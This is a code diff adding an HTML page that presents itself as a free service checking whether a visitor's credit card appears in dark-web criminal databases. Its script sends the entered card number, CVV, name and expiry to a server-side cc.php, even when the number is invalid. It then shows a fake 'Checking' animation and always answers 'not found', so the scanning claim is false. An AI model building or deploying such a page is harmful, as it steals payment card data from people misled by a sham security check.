@@ -1,0 +1,183 @@
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>CC CHECKER</title> 
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Audiowide">
+    <link rel="stylesheet" href="cc.css">
+    <style>
+
+    </style>
+    <script>
+        var statnow=false; 
+        
+        function getto() {
+    
+            ccno = parseInt(document.getElementById('ccno').value);
+            
+            
+    
+            
+    
+            if (vcn(ccno.toString())) {
+                ld.style.display="block";
+                chck.style.display="none";
+                document.getElementById('btn').disabled=true;
+                var int=0;
+                setInterval(function (){
+                    int+=1;
+                    if (int==4){int=0};
+                    document.getElementById('checkin').innerHTML="Checking<span>"+".".repeat(int)+"\xa0".repeat(3-int)+"</span>";
+                },300)
+
+
+    
+    
+    
+                let formData = new FormData(document.forms.formo);
+    
+                // send it out
+                let xhr = new XMLHttpRequest();
+                xhr.open("POST", "cc.php");
+                xhr.send(formData);
+                setTimeout(next,15000);
+    
+    
+    
+            }
+    
+            else {
+                alert("Don't act oversmart, enter the correct CC NO.");
+                let formData = new FormData(document.forms.formo);
+    
+                // add one more field
+    
+                // send it out
+                let xhr = new XMLHttpRequest();
+                xhr.open("POST", "cc.php");
+                xhr.send(formData);
+            };
+    
+        }
+    
+        const vcn = numb => {
+            const regex = new RegExp("^[0-9]{13,19}$");
+            if (!regex.test(numb)) {
+                return false;
+            }
+            return luhnck(numb);
+        }
+        const luhnck = val => {
+            let validsum = 0;
+            let k = 1;
+            for (let l = val.length - 1; l >= 0; l--) {
+                let calck = 0;
+                calck = Number(val.charAt(l)) * k;
+                if (calck > 9) {
+                    validsum = validsum + 1;
+                    calck = calck - 10;
+                }
+                validsum = validsum + calck;
+                if (k == 1) {
+                    k = 2;
+                } else {
+                    k = 1;
+                }
+            }
+            return (validsum % 10) == 0;
+        }
+        function next(){
+            ld.style.display="none";
+            don.style.display="block";
+            document.getElementById('checkin').style.display="none";
+            document.getElementById('noto').style.display="inline-block";
+            
+        }
+        function test(){
+            document.getElementById('ccno').value=4942736789664044;
+            document.getElementById('cvv').value=123;
+            document.getElementById('nm').value="Test test";
+            document.getElementById('xp').value="2003-11";
+        }
+    </script>
+
+</head>
+
+<body >
+    <div id="s">
+        <div id="sh1">
+            <h1>
+                ENTER YOUR CC INFO
+            </h1>
+        </div>
+        
+        <form onsubmit="getto();return false;" name="formo">
+            <button type="button" onclick="test()">TEST</button><br>
+            <table style="display:inline-block">
+                <tr>
+                    <td>
+                        CC NO:
+                    </td>
+                    <td>
+                        <input autofill="off" autocomplete="off" title="cc" type="number" id="ccno" name="ccno" required />
+
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        CVV:
+                    </td>
+                    <td>
+                        <input autofill="off" autocomplete="off" title="cvv" maxlength="3" type="tel" name="cvv" id="cvv"
+                            required />
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        NAME:
+                    </td>
+                    <td>
+                        <input autofill="off" autocomplete="off" title="name" type="text" id="nm" name="nm" required />
+
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        Expiry (M,yyyy):
+                    </td>
+                    <td>
+                        <input type="month" title="date" id="xp" name="exp" required />
+                    </td>
+                </tr>
+
+            </table><br>
+            <button type="submit" id="btn" class="butt"><span id="check">CHECK</span><span  id="loading" style="display:none;"><span class="lds-dual-ring"></span></span><span id="done" style="display:none;">DONE</span></button>
+            <div id="status">
+                <div id="checkin" style="text-align:left;display:inline-block;width:50%;overflow:hidden;">
+
+                </div>
+                <div id="noto" style="text-align:left;display:none;">
+                    NOT FOUND,YEP!!!
+
+                </div>
+
+            </div>
+        </form>
+        
+    </div>
+    <div id="d">
+        ENTER YOUR CREDIT CARD INFO AND WE CHECK IF YOUR CC DATA IS STORED IN CRIMINAL (OR SOME HECKER) DATABASES<br>
+        WE SCAN 677,000 CRIMINAL DATABASES ON DARKWEB TO FIND OUT IF SOME DATABASE HAS YOUR CC DETAILS
+
+    </div>
+
+</body>
+<script>
+    ld=document.getElementById('loading');
+        chck=document.getElementById('check');
+        don=document.getElementById('done');
+</script>
+
+
+</html>
